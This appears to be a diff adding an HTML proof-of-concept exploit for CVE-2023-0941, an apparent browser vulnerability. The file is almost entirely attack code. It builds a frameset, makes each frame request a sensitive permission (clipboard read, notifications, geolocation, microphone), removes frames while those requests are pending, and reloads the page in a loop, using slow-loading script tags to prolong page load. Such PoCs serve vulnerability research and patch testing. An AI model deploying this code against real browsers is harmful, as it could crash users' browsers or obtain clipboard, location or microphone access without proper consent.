@@ -1,0 +1,108 @@
+<html>
+<head>
+
+	<title>312552025 CVE-2023-0941 POC HTML</title>
+	<!--
+	<h1>312552025</h1>
+	<p>CVE-2023-0941 Proof of Concept HTML</p>
+	-->
+  	<!-- <body></body> can not work with frameset -->
+
+</head>
+
+<body>
+	<script>
+		//use revoke, not support
+		var permissions = new Array(6);
+		var frame = new Array(5);
+		var frame_ptr = new Array(5);
+	    permissions[2] = "Geolocation";
+	    permissions[1] = "Microphone";
+	    permissions[0] = "Notification";
+	    permissions[3] = "Clipboard";
+	    //permissions[4] = "FullScreen";
+	    permissions[4] = "PointerLock";
+	    permissions[5] = "Battery";
+
+		function requestPermission(this_frame, permissionName) {
+			
+			if(permissionName === 'Clipboard') {
+				this_frame.focus();
+				this_frame.navigator.clipboard.readText();
+				console.log("clipboard");
+				//alert("Page is loaded");
+			} 
+			else if(permissionName === 'Notification') {
+				this_frame.Notification.requestPermission();
+				//navigator.permissions.query({name: 'notifications'})
+			}
+			else if(permissionName === "Geolocation"){
+				this_frame.navigator.geolocation.getCurrentPosition(console.log);
+				//frame_ptr.navigator.permissions.revoke({ name: "geolocation" });
+				//frame.remove();
+			}
+			else if(permissionName === "Microphone"){
+				this_frame.navigator.mediaDevices.getUserMedia({
+			  		audio: true,
+					//video: true, // this not work under VM(no camera)
+				});
+			}
+			//console.log(this_frame);
+			//console.log(frame_ptr);
+			//frame.remove();
+			//frame.parentNode.removeChild(frame);
+			/*setTimeout( ()=>{
+                window.location.reload();
+            },6000);*/
+		}
+
+		//document.addEventListener('DOMContentLoaded', function () {
+        var frameset = document.createElement('frameset');
+        frameset.cols = '20%, 20%, 20%, 20%, 20%';
+
+        for (var count = 0; count < 5; count++) {
+            frame[count] = document.createElement('frame');
+            frame[count].src = 'notification.html'; // Set the source for each frame
+            frameset.appendChild(frame[count]);
+        }
+
+        document.body.appendChild(frameset);
+
+        setTimeout(() => {
+			for(var count = 0; count < 5; count++){
+		        frame_ptr[count] = frame[count].contentWindow;
+		    }
+		    for(var count = 0; count < 5; count++){
+		    	requestPermission(frame_ptr[count], permissions[count]);
+		    }
+
+		    //console.log(frame_ptr);
+		    // set to 3 -> not work
+		    for(var count = 0; count < 2; count++){
+	   		    frame[count].remove();
+	   		}
+
+		    setTimeout( ()=>{
+		        window.location.reload();
+		    },6000);
+		    
+	    }, 1200);
+        //});
+
+        
+
+	</script>
+
+	<!--frameset cols="20%, 20%, 20%, 20%, 20%">
+		<frame src = "geolocation.html" >
+		<frame src = "clipboard.html">
+		<frame src = "notification.html">
+		<frame src = "notification.html">
+		<frame src = "mediaDevices.html" onload="removeFrame()">
+	</frameset-->
+</body>
+<!--Ask the server to provide later, this allow browser to fully load everything properly-->
+<script src="?slow_server_response"></script>
+
+<script src="?slow_server_response"></script>
+</html>
